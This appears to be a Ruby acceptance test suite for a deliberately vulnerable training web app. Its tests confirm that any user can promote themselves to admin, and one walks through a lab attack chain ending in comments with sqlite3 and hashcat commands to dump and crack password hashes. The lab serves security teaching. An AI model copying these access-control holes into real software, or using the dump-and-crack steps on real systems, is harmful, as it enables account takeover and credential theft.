require_relative "acceptance_helper"

class AppAcceptanceTest < CapybaraTest
  def app
    Sinatra::Application
  end

  def test_get_index_acceptance
    app.db.clean!
    visit '/'
    assert page.has_title?("Index | People Against Security")
    assert page.has_selector?('.navbar'), "There's no nav. How can people find their way around?"
    assert page.find(".navbar .navbar-brand").has_content?('PAS'), "No brand in nav"
    assert page.find(".navbar").has_link?('Login'), "The user needs to be able to login"
    assert page.find(".navbar").has_link?('Register'), "The user needs to be able to register if they don't have an account."
    assert page.has_selector?(".jumbotron"), "The index should have a jumbotron explaining the site."
    assert page.has_content?("Recent Updates")
    assert page.has_content?("TheProfessor has been banned"), "The index page should tell the story of TheProfessor being banned."
    assert page.has_selector?("a.call-to-action"), "The index page should have a call to action"
  end

  def test_get_registration_page_acceptance
    visit '/register'
    assert page.has_title?("Register | People Against Security")
    assert page.has_no_selector?(".jumbotron"), "The Jumbotron shouldn't leave the index page."
    assert page.has_selector?("form#register"), "No registration form"
    assert page.has_selector?("input[name='email']"), "No email input found"
    assert page.has_selector?("input[name='password']"), "No password input found"
    assert page.has_selector?("input[name='display_name']"), "No display-name input found"
  end

  def test_get_login_page_acceptance
    visit '/login'
    assert page.has_title?("Login | People Against Security"), "Incorrect title"
    assert page.has_no_selector?(".jumbotron"), "The Jumbotron shouldn't leave the index page."
    assert page.has_selector?("form#login"), "No login form"
    assert page.has_selector?("input[name='email']"), "No email input found"
    assert page.has_selector?("input[name='password']"), "No password input found"
  end

  def test_a_user_cannot_create_an_account_without_all_required_parameters
    visit '/register'
    fill_in 'Display Name', with: "howdy folks"
    fill_in 'Email', with: 't@g.com'
    # Skip password
    click_button 'Register'

    assert page.current_url =~ /\/register/, "We should be back at the registration page, not #{page.current_url}"
    assert page.has_content?("All fields are required. Please try again"), "The user should see a message explaining why their request failed."
  end

  def test_a_user_can_create_an_account
    app.db.clean!
    visit '/register'
    fill_in 'Display Name', with: "Sammy123"
    fill_in 'Email', with: "sammy123@example.com"
    fill_in 'Password', with: "don'thackme"
    click_button 'Register'

    assert page.current_url =~ /\/profile$/, "Expected to arrive at a profile page after registering."
    assert page.has_content?("What's happening?"), "What kind of social network doesn't ask 'What's happening?'?"
  end

  def test_a_valid_user_can_view_their_profile_page
    app.db.clean!
    assert app.db.get_all_users.length == 0, "Expected the database to be empty"

    id = app.db.insert_user(*app.db.fake_user("password", hash: false))
    user = app.db.get_user(id)
    
    assert app.db.get_all_users.length == 1, "Expected to have created a new user"

    page.driver.post("/login", { email: user[2], password: "password" })
    page.driver.browser.follow_redirect! # Tell capybara to have rack-test follow the redirect

    assert page.current_url =~ /\/profile$/, "Expected to arrive at the user's profile page. Not #{page.current_url}"

    # Logging out should be unnecessary, but I'm not taking any chances.
    page.driver.post("/logout")
    page.driver.browser.follow_redirect!
  end

  def test_a_user_can_logout
    app.db.clean!

    visit "/"
    assert page.current_url =~ /\/$/, "We should be on the index page. We are at #{page.current_url}"

    id = app.db.insert_user(*app.db.fake_user("password", hash: false))
    user = app.db.get_user(id)
    
    page.driver.post("/login", { email: user[2], password: "password" })
    page.driver.browser.follow_redirect! # Tell capybara to have rack-test follow the redirect

    assert page.current_url =~ /\/profile$/, "Expected to arrive at the user's profile page. Not #{page.current_url}"

    page.find("#logout", :visible => true).click

    assert page.current_url =~/\/$/, "Expected to be returned to the home page. Not #{page.current_url}"

    visit '/profile'

    assert page.current_url =~ /\/login$/, "Expected to be required to login. Not admitted to #{page.current_url}"
  end

  def test_a_user_can_login
    app.db.clean!

    visit "/"

    id = app.db.insert_user(*app.db.fake_user("password", hash: false))
    user = app.db.get_user(id)

    click_link("Login")
    fill_in 'Email', with: user[2]
    fill_in 'Password', with: "password"
    click_button("Login")

    assert page.current_url =~ /\/profile$/, "Expected to reach the profile page with correct login."
  end

  def test_a_user_should_receive_an_error_for_bad_credentials
    app.db.clean!

    visit "/login"
    fill_in 'Email', with: "this user doesn't exist"
    fill_in 'Password', with: "blah"
    click_button("Login")

    assert page.current_url =~ /\/login$/, "Expected to be returned to the login page"
    assert page.has_content?("Invalid email or password"), "Expected to see a warning for invalid email or password"
  end

  def test_an_admin_should_be_able_to_access_the_main_manage_section
    app.db.clean!

    id = app.db.insert_user("Admin", "a@a.com", "pass")
    app.db.set_user_admin_status(id, true)

    login! "a@a.com", "pass"

    visit "/admin/manage"

    assert page.current_url =~ /\/admin\/manage$/, "Expected to be viewing the management page"
    assert page.status_code == 200, "Expected 200, got #{page.status_code}"
    assert page.has_content?("Manage"), "The page should have a manage header"
    assert page.has_link?("Users"), "The page should have a link to manage users"
    assert page.has_link?("Backup Database"), "The page should have a link to backup the database"
  end

  def test_a_user_should_not_be_able_to_access_the_main_manage_section
    app.db.clean!

    id = app.db.insert_user("Normal User", "n@n.com", "pass")
    app.db.set_user_admin_status(id, false)
    
    login! "n@n.com", "pass"

    visit "/admin/manage"

    assert page.status_code == 403, "Expected 403, got #{page.status_code} on #{page.current_url}"
  end

  def test_a_visitor_should_not_be_able_to_access_manage_users
    app.db.clean!

    visit "/admin/manage/users"

    assert page.current_url =~ /\/login$/, "Expected to be redirected to login. Not #{page.current_url}"
  end

  def test_a_user_should_be_able_to_access_manage_users
    app.db.clean!

    app.db.insert_user("Normal User", "n@n.com", "pass")
    login! "n@n.com", "pass"

    visit "/admin/manage/users"

    assert page.status_code == 200, "Expected 200, Got #{page.status_code}"
    assert page.current_url =~ %r{/admin/manage/users$}, "Expected to access the manage users page. Not #{page.current_url}"
  end

  def test_a_user_should_be_able_to_promote_theirself
    app.db.clean!

    id = app.db.insert_user("Normal User", "n@n.com", "pass")
    login! "n@n.com", "pass"

    visit "/admin/manage/users"

    form_selector = "form#manage-#{id}"

    assert page.has_selector?(form_selector), "Expected to find a form for managing the current user."

    within(form_selector) do
      assert has_content?("Promote"), "Expected to find a button to promote the current user."
      click_on "Promote"
    end

    assert current_url =~ %r{/admin/manage/users$}, "Expected to be redirected back to the manage users page. Currently at #{current_url}"
    assert has_content?(/promoted.+successfully/), "Expected a message indicating successful promotion"

    assert app.db.get_user(id)[3] == 1, "Expected user to be an admin now"
  end

  def test_an_admin_should_be_able_to_backup_the_database
    app.db.clean!
    id = app.db.insert_user("Admin", "a@a.com", "pass")
    app.db.set_user_admin_status(id, true)
    login! "a@a.com", "pass"

    visit "/admin/manage/backup_database"

    result = page.response_headers['Content-Type']
    assert result == "application/octet-stream", "Expected to download the database"
    assert page.response_headers['Content-Disposition'] =~ %r|filename="pas\.db"|, "Expected to download pas.db"
  end

  def test_a_user_should_not_be_able_to_backup_the_database
    app.db.clean!
    app.db.insert_user("Normal User", "n@n.com", "pass")
    login! "n@n.com", "pass"

    visit "/admin/manage/backup_database"

    refute page.response_headers['Content-Type'] == "application/octet-stream", "Did not expect to receive a download"
    refute page.response_headers['Content-Disposition'] =~ %r|filename="pas\.db"|, "Did not expected to download pas.db"
    assert page.status_code == 403, "Expected 403, got #{page.status_code}"
  end

  def test_a_student_should_be_able_to_complete_the_lab
    app.db.clean!
    visit '/'

    # Register
    click_link 'Register'
    fill_in 'Display Name', with: "Student"
    fill_in 'Email', with: 'student@example.com'
    fill_in 'Password', with: 'password'
    click_button 'Register'

    assert page.current_url =~ %r|/profile$|, "Expected to have been logged in and redirected to the user profile. At #{page.current_url}"

    id = app.db.get_user_by_email('student@example.com')[0][0]

    # Shouldn't be able to get to the database yet
    visit "/admin/manage/backup_database"
    refute page.response_headers['Content-Type'] == "application/octet-stream", "Did not expect to receive a download"
    refute page.response_headers['Content-Disposition'] =~ %r|filename="pas\.db"|, "Did not expected to download pas.db"
    assert page.status_code == 403, "Should not be able to download the database yet."

    # Figured out download exploit
    visit "/download/index.html"

    assert page.response_headers['Content-Disposition'] =~ %r|filename="people_against_security.rb"|, "Expected to download people_against_security.rb, Got: #{page.response_headers['Content-Disposition']} - #{page.current_url}"

    # Now they have access to the code.
    # They should find that /admin/manage/users is not properly protected
    visit "/admin/manage/users"

    assert page.current_url =~ %r{/admin/manage/users$}, "Expected to access user management. At #{page.current_url}"

    form_selector = "form#manage-#{id}"

    # Now they can elevate priviliges
    within(form_selector) do
      assert has_content?("Promote"), "Expected to find promote button"
      click_on "Promote"
    end

    assert has_content?(/promoted.+successfully/), "Expected successful elevation to admin"
    assert (app.db.get_user(id)[3] == 1), "Expected student to now be admin"

    # Now they can download the database
    visit "/admin/manage"

    within(".panel-primary") do
      click_on "Backup Database"
    end

    assert page.response_headers['Content-Type'] == "application/octet-stream", "Expected to download the database"
    assert page.response_headers['Content-Disposition'] =~ %r|filename="pas\.db"|, "Expected to download pas.db"

    # The user now has the database.
    # They just need to crack it.
    # echo ".output results.txt\n.separator :\n select password_hash from users;" | sqlite3 pas.db 
    # hashcat --username -m 0 -a 0 --show results.txt wordlist.txt
  end
end
